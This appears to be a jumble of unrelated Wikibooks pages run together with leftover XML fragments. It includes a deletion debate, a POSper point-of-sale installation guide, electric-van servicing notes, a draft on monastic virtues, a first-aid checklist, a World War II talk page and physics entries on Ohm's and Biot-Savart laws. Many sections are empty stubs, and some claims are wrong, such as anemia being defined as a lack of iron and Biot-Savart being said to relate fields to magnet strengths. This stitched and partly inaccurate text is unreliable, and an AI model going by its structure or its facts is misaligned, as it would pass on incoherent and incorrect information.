*'''Keep''' - This page itself is not a textbook, but is instead a planning page for textbooks. Planning pages are valuable resources to any author, and so I don't think that we should delete these pages on sight. However, since we can't keep it in the main module namespace, we really should move it to [[User:Ohdaloni]]'s user namespace instead. If the author intends to use these pages to write textbooks, we should encourage that (and simply correct the mistake of these pages being created in the wrong place). --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 18:43, 19 June 2007 (UTC)

* If you guys want to move it, shouldn't it go on the book's talk page instead of in user space? --[[User:Jomegat|Jomegat]] 01:22, 20 June 2007 (UTC)
*:Either place might be acceptable. Either way, it's acceptable as meta-content, even if it isnt acceptable as book content. I think the user-space is the better choice because it's personal notes, and not really intended as part of a discussion. I won't argue with it if people want to move it to the talk page instead. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 02:38, 20 June 2007 (UTC)
*'''delete''' - ravings of a lunatic, or a really ''really'' bad attempt to plan a wikibook. I guess I'm not feeling charitable today. I suppose if it's actually going to be used as meta-content, then it could be moved to talk or user namespaces (although I don't think this looks like it will yield anything worthwhile) [[User:Mike.lifeguard|Mike.lifeguard]] 00:38, 24 June 2007 (UTC)
*'''Delete''' Like the other work from this user, this is not textbook material.--[[User:Sir James Paul|Sir James Paul]] 12:07, 27 June 2007 (UTC)
*'''delete''' - I was going to vote keep, sharing Whiteknight view, but after reading a bit of the text I came to the conclusion that most of it doesn't make any sense or is even useful to be moved to another work. --[[User:Panic2k4|Panic]] 15:06, 27 June 2007 (UTC)

 |-
 | style=&quot;padding:5px;&quot; |
* Wikibooks is a collection of open-source textbooks. See [[WB:WIW|What is Wikibooks]] to find out what types of books are acceptable.
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* You should sign your name on Talk and vote pages using four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window that will insert this, too; it looks like part of a signature.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[WB:SL|Staff Lounge]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].
* Explore, [[Wikibooks:Be bold in updating pages|be bold in editing pages]], and have fun!

Why is the title called &quot;Pierogie&quot;? The Polish spelling does not have the &quot;e&quot; at the end, and neither does the English prononciation. As a reference I am also citing the wikipedia article of Pierogi which is titled without the &quot;e&quot; at the end.

      <text xml:space="preserve">POSper is a point of sale system for retail trade and restaurants. The new 'Coffeeshop Mode' supports businesses selling goods and serving tables at the same time. POSper is designed to operate with a touchscreen so that a keyboard and mouse are not required for normal operation. On the other hand, it is possible to interact fully with the application using a keyboard and mouse without the use of a touchscreen. The main application window is focused on the sales operation. 

The restaurant management features includes a visual display of tables which includes a visual cue to indicate which tables are occupied or free. It is easy to set up this layout to correspond to the physical layout of the restaurant. 

In 'coffeeshop mode' the user can easily switch between retail mode and restaurant mode.

POSper supports numerous devices, e.g. ESC/POS ticket printers like the popular Epson TM 88 series, customer displays like Epson DM-D110/210 and compatibles, barcode readers for fast article entry, scales, and card readers.

POSper is Java based and can run on any PC system independent of the operating system. 

The heart of POSper is a relational database where all products and transactions are being stored. The POSper teams commitment to support open standards guarantees long term compatibility to other systems which may want to connect to POSper like ERP systems, backoffice applications, etc.

POSper takes advantage of Hibernate [http://www.hibernate.org] which allows to use any database supported by Hibernate like  MySql, PostGreSQL, Oracle, HSQLDB, and many others.

The system is fully internationalised and currently supports Spanish, English, German and Portuguese. Other languages can be added easily. If you want to contribute to translations please contact the POSper team.

For system security and accounting the system allows for the creation of multiple user accounts. Accounts are assigned roles in order to determine their capabilities. The default roles are:

* Administrator
* Manager
* User
* Guest

but roles can be altered and new roles can be defined. There are administration options to manage users, set passwords and configure other aspects of the application.

The system can fully be managed from the user interface provided the user has been granted the proper rights.
There are management options to make closings, to manage products and to manage the organization of products into categories.

Of course there are reports and charts of products, closings and sales.

One of the most important strenghts pf POSper is it's configurability. It can be adapted in many aspects like layout, features,
discounts, taxes, reports, devices, and more.

      <text xml:space="preserve">== Program installation ==

=== Step 1. Install java ===
POSper is an application developed in java and to execute it you will need the java runtime enviroment from Sun Microsystems versions 1.6 or greater. To install the java runtime enviroment follow the instructions of the link http://java.com/en/download/index.jsp.

If you are going to use a serial or USB device like ticket printer or cash drawer you must in addition download RXTX 2.1.7 from http://rxtx.qbang.org.
Other than mentioned in the RXTX install instructions
the RXTX library for your system can be placed in the POSper
install directory. This is a safe way to retain the RXTX
library when you ugrade your Java version.
The RXTXserial.jar file is already present in libs.

=== Step 2. Download and unpack POSper ===
Download the last version of the binary package of POSper from Sourceforge [http://sourceforge.net/project/showfiles.php?group_id=175878]. Extract the files to an empty folder.

=== Step 3. Configure and run it! ===
Refer to the file readme.txt in the directory you've POSper extracted to. Follow the instructions.

When running POSper for the first time you will be asked a password that allows you to create
a new database. This password is always 'setup' and cannot be changed. It exists only for safety reasons
to avoid an existing database to be overwritten in case of database or network errors.
Never enter this password when a database should already exist.

== Setting up your Program in Windows==

1.Once you have unzipped POSper into your folder, find the file called &quot;posper.exe” (it will look like a gear in a program window). Right-Click on it and select “Create Shortcut”. Then drag that Short-cut onto your desktop. 

2.The Short-cut that you just pasted onto your desktop is the icon that you double-click on to open your program. 
Before you go ahead and Double-click on it run the configuration program config.exe which allows you to choose another than
the default HSQL database - see readme.txt.

3.Follow instructions in &quot;Setting up your program : Common&quot; below

== Setting up your Program in Linux==

0.These instructions assume you're using Nautilus.

1.Once you have unzipped POSper into your folder, find the file called &quot;posper&quot;.  It looks like a piece of paper with a grey gear on top.

2.Right click it and select &quot;make link&quot;

3.Drag 'n' drop this link to your desktop, which you can now doubleclick to run POSper. Before you go ahead and Double-click on it run the configuration program config.exe which allows you to choose another than the default HSQL database - see readme.txt.

4.Follow instructions in &quot;Setting up your program : Common&quot; below

== Setting up your Program in Mac OS X ==

First make sure that you are running the latest version of Java. It can be obtained from the Apple Developer website.

0. Unzip the POSper folder into your Applications directory. Instructions in readme.txt that refer to Linux are also valid 
for MAC OS X.

1. To configure POSper, double clik on &quot;config&quot; and follow the instructions.

2. The next time you want to use POSper double-click on the file &quot;posper&quot; You can create a shortcut by dragging this file to your dock.


== Database configuration ==

IMPORTANT: Before you proceed to the setup described in 'Setting up your Program : Common', you need to decide which database
system to use and go through the configuration steps below.

POSper uses hibernate to store the application data including but not limited to products, sales, and users.  Hibernate supports a wide variety of database systems such as HSQLDB[http://hsqldb.org], PostgreSQL[http://www.postgresql.org], and MySQL[http://www.mysql.com].

It is strongly recommended to use a production grade database like PostgreSQL or MySQL for productive systems!

To configure the database go to the configuration panel in POSper or run the file &quot;config.exe&quot; in windows or &quot;config&quot; in linux.

The database configuration section is at the top in the &quot;Database&quot; section.

'''Driver library:''' Is the file provided by the database engine vendor that contains the JDBC driver that allows java programs to comunicate with the database.

'''Driver class:''' Is the java class name that implements the JDBC driver. This name is also defined by the database engine vendor.

'''URL:''' Is the connection string that uses JDBC to localize JDBC, the driver, and the database.

'''User:''' The name of the database user.

'''Password:''' The password of the database user.

=== HSQLDB ===
The default configuration of POSper uses HSQLDB for data storage. The HSQLDB library is distributed with the binary package of POSper and you do not have to worry about the database configuration if you want to use this database.

HSQLDB is a simple SQL relational database engine, potentially less efficient than other database engines.

=== PostgreSQL ===
To use POSper with PostgreSQL you must have a PostgreSQL server running and the JDBC driver for PostgreSQL. To download the server and the JDBC driver follow the link http://www.postgresql.org/download.html. After the database server is installed and running you have to create an empty database for POSper and a database user with privileges to connect to this database. For further assistance with this process, reference the PostgreSQL documentation[http://www.postgresql.org/docs/].

The JDBC driver file for PostgreSQL is named &quot;postgresql-''&lt;version_number&gt;''.jdbc3.jar&quot; and the class name is &quot;org.postgresql.Driver&quot;.

An example of a database configuration using PostgreSQL as database engine is:

 Driver library: postgresql-8.0.309.jdbc3.jar  
 Driver class: org.postgresql.Driver  
 URL: jdbc:postgresql://localhost:5432/posper
 User adrian  
 Password: adrian

With these parameters a PostgreSQL database server is in localhost listening in the 5432 port and with an empty database called posper. The user adrian has privileges to connect to this database.

=== MYSQL ===
To use POSper with MySQL is very similar as PostgreSQL, you must have a MySQL server running and the MySQL Connector/J. To download the MySQL server and the MySQL Connector/J follow the link http://dev.mysql.com/downloads/. To install MySQL follow the link http://dev.mysql.com/doc/. After the database server is installed you must create an empty database for POSper and a database user with privileges to connect to this database. For further assistance with this process, reference the MySQL documentation[http://dev.mysql.com/doc/].

It is recommended to download the MySQL Tools along with the MySQL Server. The tool MySQL Administrator is very helpful in creating an empty schema and setting up the users if you're not familiar with command line MySQL. 

Note that Oracle has declared End Of Life for MySQL Tools and replaced them by MySQL WorkbBench. While WorkBench is a great program it lacks some features MySQLAdministrator had: scheduled backups and the ability to backup InnoDB databases in one transaction are only available in the commercial version (sad story). 

The MySQL Connector/J package contains the JDBC driver that POSper needs to connect to the MySQL database server. The driver library file is named &quot;mysql-connector-java-''&lt;version_number&gt;''-bin.jar&quot; and the driver class name is &quot;com.mysql.jdbc.Driver&quot;. To obtain this package, visit: http://www.mysql.com/products/connector/j/ 

Once you have downloaded MySQL Connector/J package, unzip the contents and place it in the same folder where POSper resides.
For your convenience the connector mysql-connector-java-5.0.8-bin.jar is already included in the POSper distribution and you can 
use it with MySQL 5.0 or greater.

An example of a database configuration using MySQL as database engine is:

 Driver library: mysql-connector-java-5.0.8-bin.jar
 Driver class: com.mysql.jdbc.Driver  
 URL: jdbc:mysql://localhost:3306/posper
 User: adrian
 Password: adrian

With these parameters a MySQL database server is in localhost listening on the 3306 port and with an empty database called posper. The user adrian must have privileges to connect to this database.

&lt;br /&gt;
&lt;br /&gt;
&lt;big&gt; '''Setting up the mySQL Database for utf8 Code Tables'''&lt;/big&gt; &lt;br /&gt;
&lt;br /&gt;
'''utf8''' is used in many Arabic, Eastern and Asian environments.&lt;br /&gt;
So, if for instance, you want to input Chinese characters you need to reconfigure POSper and mySQL. &lt;br /&gt;
You can then input western characters and utf8 characters encodings into POSper :&lt;br /&gt;
&lt;br /&gt;
'''Procedure''' (for LINUX sects) :&lt;br /&gt;
Database Setup and Configuration (before running Posper) :&lt;br /&gt;
&lt;br /&gt;
* Logon into your mySQL Query Browser and configure&lt;br /&gt;
CREATE DATABASE posperdb CHARACTER SET utf8 COLLATE utf8_bin;&lt;br /&gt;
then make use of the database :&lt;br /&gt;
USE posperdb;&lt;br /&gt;
don't forget to check whether this has been successful or not.&lt;br /&gt;
* Lookup the mySQL configuration file my.conf, it's probably in /etc/mysql/&lt;br /&gt;
and edit my.conf, as root, the section after [mysqld]:&lt;br /&gt;
[mysqld]&lt;br /&gt;
default-character-set=utf8&lt;br /&gt;
* In the POSper DATABASE configuration edit the url :&lt;br /&gt;
jdbc:mysql://localhost:3306/posperdb?useUnicode=true&amp;characterEncoding=utf8&lt;br /&gt;
&lt;br /&gt;
Tested with POSper 1.0-851, Ubuntu 10.04 32 &amp; 64 Bit Desktop, Java 1.6.0_22&lt;br /&gt;

== Setting up your Program : Common ==

1.You'll see the splash screen with a status bar telling you each step of startup as it happens.

2.You will then see the Opening Screen for “POSper”. Now click on “Admin”.

3.You should now see your sales window. On the left side of the Screen are some menus for you to select from. Under “Administration”, click “Stock”, and then “Taxes”.  By default, &quot;no tax&quot; and a sample tax of 5% are available.

4.If you need to add more taxes, click the new button (shows as a star on a piece of paper, third from the right).  Then choose a unique id, name the tax, and pick a percent.

5.Once you are finished adding any taxes you need, click on the save button (the floppy disk, first button from the right).

6.Go back now under “Administration”, and click “Stock” again.

7.Now click the button that says “Categories.”

8. You will be brought to a screen very much like the Tax screen. Here is where you categorize your food items. Under “ID”, it always needs a number. I suggest making each category an increment of 100. So for example, I will type “100” in the “ID” and then under the “Category”, I will type in “Coke Cans”. Then the next, “200”, and “Little Debbies.” Figure out how you want to categorize your food items and then make your categories. You can also add pictures for each category. Make sure you save after each category.

9. After you have made all of your categories, you will need to type in your products. “Administration”, then “Stock”, then “Products”.

10.Once again, each item must have it’s own unique number. For instance, for “Mr. Pibb”, type in a Reference like 101, and for “Mello Yellow”, a Reference like 102.

11.For Buy price, try and figure out how much each individual item costs you, if you do not know, type in some number below what you are selling it at. Either way, you need to type in a number to make the program happy. (Ex. For Coke 20 oz bottles, a case of 24 costs $15.05. So I divide $15.05 by 24 and end up with  .627, so I then type “.627” into the “Buy Price” (You can give it as many digits as you like, and it will figure it out). 

12. For “Sell price”, enter the amount that you intend to sell the item at. So for Coke, that number would be “1.00”. Immediately it will fill in two of the boxes for you. Now Beside “Tax”, select the appropriate tax (for instance &quot;no tax&quot;) and for “Category” select the category you wish for the item to be in for ex. “Coke Bottles”.

13. To save the product click the icon with the flower on it.

14. Repeat step 12 to 15 for each product you'd like to add.

15. Click &quot;maintenance&quot; and then &quot;users&quot; in the administration panel.  Note that POSper provides 4 default users : &quot;Guest&quot;, &quot;Admin&quot;, &quot;Manager&quot; and &quot;Employee&quot; (each has permissions consistent with their name).  You can delete these default users if you want to customize all four roles, or you can leave some or all of the defaults intact.

16. To add a new user, click the icon with the flower on it. Type in the name under “Name”, and then select their role. If you want the user to be active, make sure the visible checkbox is on.  If it isn't, they won't show up in the login menu.  Role provides permissions to the new user.  A Guest is only able to make sales.  An Employee can have a password and can perform sales, refunds, and payments.  A manager is able to do all of this and also has access to reporting.  An admin has access to all the functionality in the system. 

17. Setup is now complete and the system is ready to go!



NOTE: Once you have followed all the steps above run POSper. It will now populate the database for you, and you're off and running.

=General Servicing=

Before doing any significant work on the Berlingo the high voltage and 12v battery should be isolated...

=Fault Finding=

A very slight (almost imperceptable) shudder can be felt around 5-10 mph while accelerating or decellerating.

It is important to not drive the vehicle for more than about 5 miles after the first shudder is felt.  Continuing to drive for any distance other than obsolutely necessary could result in very expensive damage to the motor commutator. Left uncheck this will progress to juddering at low speed and eventually the van will completely stop after about 10 miles.

*Torx set ??


=Maximising Range=
==Current Consumption==
Each accessory draws a certain amount of current and, to a small extent, will therefore affect the maximum range of the vehicle.

==Techniques==
Because the energy lost from drag is not linear with speed, the slower a vehicle travels the less
overal energy is used. This can affect the range by as much as ?? %.

===Low Stress Driving Near Maximum Range===
Driving upto the maximum range can be stressful experience.
The following process will allow you to make good progress and automatically takes into account the affect of rain, slightly binding brakes, hills, etc and minimises the risk of not reaching your destination.

*Determine the optimum maximum range prior to required trip.
*Plan the trip
*Monitor energy usage during the trip

====Determining the Optimum Maximum Range====
Prior to starting the actual long trip, if you have not already done so, determine the maximum range of your vehicle at the optimum conditions of slow speed and in dry conditions as follows:
*Choose 3 representative circular routes of about 15, 5 and 2 miles
*Start with a fully charged vehicle
*Reset the odometer
*Drive around the representative route several times at 35 mph to use up most of the charge.
*Then drive around the successively smaller routes to use up most of the remainder without being stranded.

This book is for the average person interested in loving God and their neighbor. It is meant to be a guide on how to be &quot;good&quot;. This is also a book for those interested in helping others be &quot;good&quot;. The point of the book is to be a guide to renewing the monastic orders for today, for both the teachers and the taught. Both of which, in the understanding of this author, and hopefully those contributing to the development of this guide, are one and the same. Sometimes we teach, always we learn.

The guide will look at the spiritual disciples, rules of life, and the practice of the virtues at the very least. Since it is easiest for those without an identifiable faith in a higher being to engage in this discussion (and we do not wish to exclude anyone from trying to be &quot;good&quot;) we will start there. Those who wish may continue on to discussions on the practice of those disciplines which are overtly &quot;spiritual&quot; in nature and how they might be incorporated into a rule of life.

==Introduction==
===What is Monasticism?===

When we think of Monasticism we think of monks and nuns. Strange people wearing strange clothes doing strange things. We think of them as wholly and completely &quot;different&quot; than us. And this is not without their intention. The funny clothing and practices are meant to &quot;set them apart&quot; from the local crowd in the town square. Otherwise, why would they dress and act in such a peculiar manner? Many (myself included), often dismiss monastics as cranks, wackos, or just plain old eccentrics. We know very little to nothing of their inner lives, nor their personal lives outside of passing them in the bakery or grocery. A very few of us might harbor a vague notion that these are 'holy' people dedicated to god in some profound manner in which we, as normal people, are not.

As you might have guessed, this is not a full, or accurate, picture of what it means to be a part of a monastic order. It is regrettable to me that we as human beings so often dismiss, or even mistrust, that which is different from us. With respect to the monastic orders, this is a double tragedy. Not only does our lack of familiarity with the substance of monasticism keep the average  person from forming relationships with these extraordinary people, and thus immensely enriching our own lives. It also keeps us from coming into contact with the spiritual disciplines practiced by these 'peculiar' folk. This second tragedy is perhaps the greater. A fact that is confirmed by the very fact that monastics of all types might agree that the world might or might not be better off knowing them as individuals, but is surely impoverished by being unfamiliar with the practices to which they so humbly dedicate themselves. Fortunately, this is a reversible error.

So far, I have intimated that there indeed is something of great values swaddled up in the monastic orders. Cloaked as it were from the outside, this Pearl of Great Price is indeed difficult to see, much less observe in great detail. Seeing is difficult enough. Describing is even harder. Yet, that is my task, and I shall begin, as is easiest with most difficult topics, at the beginning.

===How was it historically practiced?===

It is often noted that Jesus was the first monastic, but this is simply too simplistic. What or who was Jesus's example? Perhaps the lilly or sparrow, perhaps John the Baptist or even more likely the old testament saints and prophets. But there is a sense that after the time of Jesus the practice of holy living began new...
====Different Forms of Monasticism====

There are many forms of 'monasticism' in many of the worlds largest and smallest religious belief systems. This fact helps us make the observation that &quot;monasticism&quot; is not an expression of spiritual practice owned by any one sect or order, rather, it is a human trait. To many, this is threatening and sounds like syncretism. I think this danger is more apparent than real. All forms of monasticism grow out of a deep love and respect for the tradition in which it is founded (even the reformist monastics). Corruptions or non-harmonic inclusions of foreign practices, beliefs or traits will surely be guarded against by those entrusted to &quot;keep&quot; their various traditions in tact.

The point is that far from being a phenomenon owned (and hoarded) by any one order against the need of all. All can benefit by the practices of, in fact, any order (even if that is what NOT to practice). To make the point concrete. In some sense, it is appropriate to look at the practices of all monastics as a spiritual buffet from which we can pick and choose those practices that bring us the most spiritual sustenance. Yes, to be sure, there are dangers to this approach. Those will be addressed later. However, the point should not be missed. We can all benefit by incorporating the practices of the very devout into our very ordinary lives. It is OK to start with those practices that we most easily understand, can incorporate into our lives, and bring the most benefit to us spiritually.

=====The Early Practitioners====
=====The Major Orders=====
=====The Franciscans=====
=====The Dominicans=====
=====The Capuchins======
=====The Sisters of Mercy=====
=====The Benedictines=====

===Is there anything &quot;good&quot; about it?===
===Why does it need to be &quot;reformed&quot;?===
===Why would the average person want to practice it?===

==The Virtues==

===Courage===
What is courage? This is a tough question. This can be a surprise. We all know what courage is--right? People who do scary things, they are courageous. People who show no fear when everyone else around them is scared, they too are courageous. Yet, to be able to recognize a thing is not the same as to be able to describe it. This is the case with courage as we will soon see. This is the case with all virtues.

So, let us take to the task. Is courage simply a lack of fear? This is a good start, but let's examine it closer. Can we think of a time when someone who might lack fear might also be described as lacking courage? Sure, the image of a man, asleep in his bed on a rainy night, dead to the world and snoring away as a rushing torrent careens down through a swollen river channel, over its banks, and straight towards his house and his certain death. This man is likely to be completely unaware of his impending doom, and also completely at peace though facing certain death. Yet, we are not likely to describe him as courageous.

So, a lack of fear is not to be equated with being courageous. Courage apart from merely being the absence of something else, such as fear, must also affirmatively BE something. In a way, describing any virtues is like describing the wind. It is easier to see what the wind does than to describe the thing itself. So with the virtues.

Nonetheless, that is our task. So, if we can say that courage IS NOT the lack of fear, or some other quality, what can we say that it IS? Let's again look at our previous example. Can we imagine a circumstance under which we might describe the man in his bed as courageous? Would we describe the man in his bed as courageous if he were awake in his bed? Perhaps, it seems, given our last example, that consciousness is at least one necessary condition for courage. Sleeping men do not fear. Unless, of course, they are having a nightmare, but this is a different topic.

===Wisdom===
===Persistence===
===Temperance===

==The Spiritual Disciplines==

===Prayer===
===Charity===
===Solitude===
===Contemplation===
===Service===
===Advocacy===
===Sacrifice===
===Celibacy===
===Fasting===

In some religions, people speak of the fasting of the body, abstaining from food and water for a certain period of time, usually between sunrise and sunset.

However, one should also consider the fasting of the mind and soul, being mindful of one's thoughts and actions throughout the day as well.

===Self-Denial===

==Rules of Life==
A Rule of Life is an interesting concept. It is not a mission statement. And, despite the word &quot;Rule&quot; in its name, it is not a legalistic or pharisaical document. It is more like a written version of wedding vows than these other concepts. Yet, there is an element of a mission statement or a legal code bound inside the idea of the Rule of Life that various monastic communities have adopted.

===Components===
Principles
Commitments
Consequence
Reward

===Making Your Own===
What is important to consider?
How much money it is to start and if you are allowed. I am assuming for a Buddhistm monastery, perhaps you could get funding through other monasteries that have already been established. As for a Catholic or Orthodox monastery, one needs to obtain a certain amount of credentials. 

I believe that for a monastery set up by the Catholic or Orthodox Church one needs to be an ordained priest and has to have a certain amount of funding.

===Keeping Your Own===
How is it done?

==Putting It All Togther==

===Trying to be &quot;Good&quot; alone===
===Trying to be &quot;Good&quot; in community===
===The Role of the Teacher===
===The Role of the Student===
===Spiritual Friendship===
===Spiritual Authority===

==&quot;The Order of the Greens&quot;==

==Checking for underlying causes==
While waiting for professional help to arrive with a patient who is sick or injured, you can check a number of things which may indicate the cause of an illness.  This information should then be given to the ambulance crew or doctor to speed up their diagnosis. If you spot any of these signs, it is imperative to seek professional medical assistance, if you have not already done so.  The key things to look for can be summarized in the mnemonic '''JACCOL''', which stands for:
*'''J'''aundice - Jaundice is a yellowing of the skin, and is most obvious under the eyelids in adults.  To check, ask permission, and then gently peel back the patient's eyelid to observe the colour.
*'''A'''nemia - Anemia is the lack of iron in the blood, and it causes pallor also under the eyelids, but possible also around the gums.  Look for this at the same time as jaundice.
*'''C'''yanosis - Cyanosis (cyan=blue) is the blue tinge that comes with lack of oxygen reaching the body tissues.  This can be seen best on the lips and gums, and sometimes on extremities such as fingers.
*'''C'''lubbing - Clubbing is an indicator of an underlying body chemistry problem.  The test for this is simple.  Ask the patient to place the fingernails of their right and left index fingers together (flat against each other, facing the same direction).  If you can see a gap (diamond shaped) between the fingers where the cuticle is, then everything is normal.  If their fingernails and fingers form a flat interface, then medical advice should be sought.
*'''O'''edema - [[First Aid/Appendix A: Glossary#Oedema|Oedema]] is a swelling, usually seen in the lower legs.  You can tell oedaema from other types of swelling by gently pushing it with a finger.  If your finger leaves a dent, then the swelling is likely oedaema.
*'''L'''ymph nodes - The lymph nodes are in your neck, and quite often become 'puffy' when a patient is ill.  Look at the patient to see if they seem to be swelled up around the sides of the neck.

==Additional tests for spinal injuries==
There are some additional neurological tests that can be done, if you have the proper training, to help you assess whether the victim has a spinal injury.

      <text xml:space="preserve">==Structure==
I would suggest changing the structure to match the one used on the [http://en.wikipedia.org/wiki/World_War_II Wikipedia article], IMO, it does a pretty good job of breaking down the war fairly logically. Right now though, it's still considerably underdeveloped, especially in terms of the Asia-Pacific Theatre. [[User:74.96.220.97|74.96.220.97]] 01:43, 5 July 2007 (UTC) 
:That sounds good to me. We may want to simplify it for the audience. I don't know very much about the subject. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 13:55, 5 July 2007 (UTC)

== Ready to Go! ==

I've tried to do some of the preliminary work to get this book started. But I really don't feel competent to write on this subject. I hope that someone who does will come along and take ownership of this project. Please [[WB:BOLD|Be Bold]]. As far as I'm concerned, right now before this book gets going, an interested author could change anything including the templates, the front page, the order, the list of articles, really anything. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 04:59, 11 July 2007 (UTC)

:Howdy Xixtas.  I applaud your idea, but, IMO, we're not ready for it yet.  If you look at the [http://simple.wikipedia.org/wiki/World_War_II Simple English WW2 article], you can see the potential problems for bias and ''over'' simplification (to the point of inaccuracy).  Also, the main article on the Wikipedia is woefully inadequate.  My suggestion would be to come help us on the Wikipedia article until you get a feel for the subject, once that's in a half decent shape, then we can work on simplifying it (without introducing obvious bias' like &quot;Allies good, Axis bad&quot;).

::Hi Xixtas and 199.243.154.46,
::I see and understand your concerns about this particular book. However, i wish, within the next seven days, to make a  significant start on it, writing articles and the likes, concentrating my time on getting the project moving. I have studied the topic in question for the last two years and feel that I have an appropriate knowledge of the topic, and an un-biased view of the matter.
::Hope this helps to put some of your worries at ease

:::Like I've said elsewhere, this project will be unlike anything we've ever done here before. I expect it will take a long time to get it ready for publication. I think it's exciting that we are trying something so difficult. It's just not my cup of tea.

== People Why Have You Kept Wikijunior In Limbo  ==

Hey People, why have you guys not completed this book since some 8 months! If you have already abandoned it then please opt your book out of the status of Current Wikijunior. Please give other Wikijunior a chance to get developed, if you guys have other things to do. The book seems to be promising. But really people it is an epic fail. The community should have chosen some book to be developed for the kids which is actually useful and interesting to the kids!! Kids want to read comics, short interesting stories or nice encyclopedias about animals or cool photographs of birds or interesting stuff about stars, planets or Universe etc or at least some fantasy stuff. This wiki book was bound to fail from the beginning because tell me how many people are comfortable about talking about their countries roles in World War 2. No countrymen can say with a clear conscience that their country was absolutely pure in WW2. It was just a mindless war. 

Other Wikijuniors written under Wikijunior books earlier seem to be much better.  &lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:202.3.77.11|202.3.77.11]] ([[User talk:202.3.77.11|talk]] • [[Special:Contributions/202.3.77.11|contribs]]) 19:30, 11 October 2009.&lt;/small&gt;

{{Wikipedia|Ohm's law}}

== Ohm's Law ==

Ohm's Law is a mathematical law that takes several different forms, depending on application. While we will discuss other forms later, we will start with the form of primary mathematical interest.

We can use Ohm's law to relate the average current density to the electric field, by using a constant quantity of the conductor, known as the '''conductivity''':

Ohm's law can be stated as:
{{eqn|Ohm's Law}}
:&lt;math&gt;\mathbf{j} = \sigma \cdot \mathbf{E}&lt;/math&gt;

where '''j''' is the current density (current per unit area), σ is the conductivity and '''E''' is the electric field. 

== Conductivity ==

Each different type of conductor will have a unique constant conductivity, which can typically be determined through experimentation.</text>

{{Wikipedia|Biot-Savart Law}}



== Biot-Savart Law ==

The '''Biot-Savart''' law relates the magnetic '''B''' field to the distances and strengths of magnets in the field. In many respects, it's very similar to Coulomb's law, both in form and concept.

We can state the Biot-Savart Law as:

{{eqn|Biot-Savart Law}}
:&lt;math&gt; d\mathbf{B} = K_m \frac{I d\mathbf{l} \times \mathbf{\hat r}}{r^2}  &lt;/math&gt;

Where:
:&lt;math&gt;K_m = \frac{\mu_0}{4\pi} \,&lt;/math&gt;, where &lt;math&gt;\mu_0&lt;/math&gt; is the magnetic constant
:&lt;math&gt;I\mathbf{}&lt;/math&gt; is the current, measured in amperes
:&lt;math&gt;d\mathbf{l}&lt;/math&gt; is the differential length vector of the current element
:&lt;math&gt;\mathbf{\hat r}&lt;/math&gt; is the unit displacement vector from the current element to the field point and
:&lt;math&gt;r\mathbf{}&lt;/math&gt; is the distance from the current element to the field point

This formula is only true for a steady current, which means that electric charge is not building up anywhere. This is analogous to Coulombs law, which is only true for static charge distributions. When the current is not steady and charge distribution is changing, we have to add correction terms to the Biot-Savart Law. However, the Biot-Savart law is unreasonably robust, more so than Coulomb's Law. This is because most of the errors (the first-order error) will cancel out. Thus, Biot-Savart Law can be applied to cases that are clearly not steady; for example, household currents that alternate at 60 Hz.

==Forms==
===General===
In the magnetostatic approximation, the magnetic field can be determined if the current density '''j''' is known:

:&lt;math&gt;\mathbf{B}= K_m\int{\frac{\mathbf{j} \times \mathbf{\hat r}}{r^2}dv}&lt;/math&gt;

where
:&lt;math&gt;\mathbf{\hat{r}} =  { \mathbf{r} \over r } &lt;/math&gt; is the unit vector in the direction of '''r'''.
:&lt;math&gt;dv&lt;/math&gt; = is the differential unit of volume.

===Constant uniform current===
In the special case of a constant, uniform current '''I''', the magnetic field '''B''' is

:&lt;math&gt; \mathbf B = K_m I \int \frac{d\mathbf l \times \mathbf{\hat r}}{r^2}&lt;/math&gt;

===Point charge at constant velocity===
In the special case of a charged point particle &lt;math&gt;q\mathbf{}&lt;/math&gt; moving at a constant velocity &lt;math&gt;\mathbf{v}&lt;/math&gt;, then the equation above reduces to a magnetic field ''approximately'' of the form:

:&lt;math&gt; \mathbf{B} = K_m \frac{  q \mathbf{v} \times \mathbf{\hat{r}}}{r^2} &lt;/math&gt;

This formula, however, is wrong. This is because a point charge moving in a straight line does not constitute a steady current nor a constant charge distribution, both of which are essential to magnetostatics. In particular, in this case, there is a changing electric field and an induced magnetic field that must be added to correct the above formula. Even though the equation is not precisely correct, it is a very good approximation (unreasonably good, in fact).

===Microscopic Scale===

On the microscopic scale, the Biot-Savart law becomes,

:&lt;math&gt; \mathbf{H} = \epsilon \mathbf{v} \times \mathbf{E} &lt;/math&gt;

and hence,

:&lt;math&gt;
\mathbf{B} = \mathbf{v}\times \frac{1}{c^2}\mathbf{E} 
&lt;/math&gt;</text>

{{Wikipedia|Ampère's Circuital law}}

In physics, '''Ampère's Circuital law''', discovered by André-Marie Ampère, relates the circulating magnetic field in a closed loop to the electric current passing through the loop. It is the magnetic equivalent of Gauss's Law.

==Original Ampère's Circuital law==

